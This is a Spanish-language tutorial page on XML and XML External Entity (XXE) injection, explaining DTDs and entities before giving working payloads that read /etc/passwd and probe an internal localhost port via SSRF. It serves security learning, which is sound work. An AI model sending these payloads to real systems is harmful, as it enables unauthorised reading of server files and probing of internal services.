---
cover: >-
  https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE4vynbkNnVM5319Tqu87L0GPgcmxXrIz91Ctiikj1LTah-5opAiIzT5JkV3wlpHlgJdGXosG901oQ45kz9Pfogkkm9yjajnyOgVKsKo3tG3XVhclUEWpPqjxIN7APc0hgxnsHH7k6nAJci5OkwDFj8EKjMP_h-fOYYsP8Tp7ceYQuInfdtt_L-d0G/s16000/XXE-Attack.jpg
coverY: 64
---

# XML External Entity Injection (XXE)

## ¿Que es XML?

XML es un lenguaje de marcado diseñado para transportar datos. Este lenguaje usa una estructura de árbol, como HTML, pero a diferencia de este, las etiquetas no son predefinidas, los nombres de las etiquetas dan información de los datos que contiene. Este es un ejemplo de una estructura XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<note>
  <para>Tove</para>
  <de>Jani</de>
  <titulo>Reminder</titulo>
  <cuerpo>Don't forget me this weekend!</cuerpo>
</note>
```

## ¿Que es un XXE?

Los ataques XML External Entity Injection (XXE), son inyecciones que permiten a un atacante interferir en el procesamiento de datos XML de una web. Existen diferentes tipos de ataques XXE:

* **XXE de recuperación de archivos:** En este tipo de XXE, se pretende recuperar un archivo del sistema del servidor
* **XXE derivado a SSRF:** En esta variante de los XXE, se pretende derivar el XXE, a un ataque de tipo SSRF, y falsificar las solicitudes del lado del servidor
* **Blind XXE de filtrado de datos OOB:**
* **Blind XXE de recuperación de datos a través de mensajes de error:** Este ataque ofrece una vision distinta, ya que permite visualizar los archivos en el error.

## Document Type Definition (DTD)

El XML Document type definition, contiene declaraciones que definen la estructura de un documento XML. EL DTD, se declara dentro del elemento `DOCTYPE` opcional que da comienzo al documento XML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "Note.dtd">
<note>
    <para>Tove</para>
    <de>Jani</de>
    <titulo>Reminder</titulo>
    <cuerpo>Don't forget me this weekend!</cuerpo>
</note>
```

## Entidades XML

Las entidades XML, son una forma de representar un elemento de datos sin necesidad de un documento XML, en lugar de usar los datos en si.

### Entidades XML Personalizadas

XML permite entidades personalizadas que pueden ser definidas sin el DTD, por ejemplo:

```xml
<?xml version="1.0"?>
<!DOCTYPE tutorials [ <!ENTITY footer "Gracias, esperamos que vuelvas!"> ]>
<tutorials>
  <tutorial>
    <name>XML Tutorial</name>
    <url>https://www.quackit.com/xml/tutorial</url>
    <footer>&footer;</footer>
  </tutorial>
  <tutorial>
    <name>HTML Tutorial</name>
    <url>https://www.quackit.com/html/tutorial</url>
    <footer>&footer;</footer>
  </tutorial>
</tutorials>
```

En este caso, `footer` es la entidad, y `"Gracias, esperamos que vuelvas!"` es el valor de la entidad. Para invocar dicha entidad, debemos de hacerlo con la siguiente sintaxis: `&entity_name;` .

### Entidades XML Externas

Las entidades XML externas, es un tipo de entidad personalizada en la que el valor se ubica fuera del DTD. Para poder declararlas hay que seguir una cierta sintaxis:

```xml
<!DOCTYPE tutorials [ <!ENTITY entity_name SYSTEM "URL"> ]>
```

```xml
<!ENTITY entity_name SYSTEM "URL">
```

Existen varias formas de pasarle un valor a la entidad, el primero es mediante una URL:

```xml
<!ENTITY writer SYSTEM "https://www.w3schools.com/entities.dtd">
<!ENTITY copyright SYSTEM "https://www.w3schools.com/entities.dtd">

<author>&writer;&copyright;</author>
```

El otro, es mediante un archivo usando el protocolo `file://` .

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

## Explotando un XXE para obtener ficheros

En el caso que queramos explotar un XXE y ver ficheros del servidor en la respuesta, lo podemos hacer añadiendo un DTD y modificandolo:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

En este caso, mediante `file://` vemos el archivo `passwd`, ahora solo tendremos que incluir la entidad `&xxe;` en uno de los campos de datos del XML. EJ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>
    &xxe;
    </productId>
</stockCheck>
```

## Explotando un XXE a SSRF

Este ataque consiste en obtener information que solo se puede ver internamente a través de el XXE, por ejemplo, tienes una web que en una solicitud, usa XML, y este es vulnerable, puedes usar las entidades personalizadas internas para mediante una solicitud a un puerto que solo se puede ver desde dentro, obtener información acerca de el, por ejemplo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://localhost:8080"> ]>
<stockCheck>
    <productId>
    &xxe;
    </productId>
</stockCheck>
```



{% hint style="info" %}
Enlaces de Interés:

1. [https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
2. [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
3. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
4. [https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
5. [https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list)
{% endhint %}
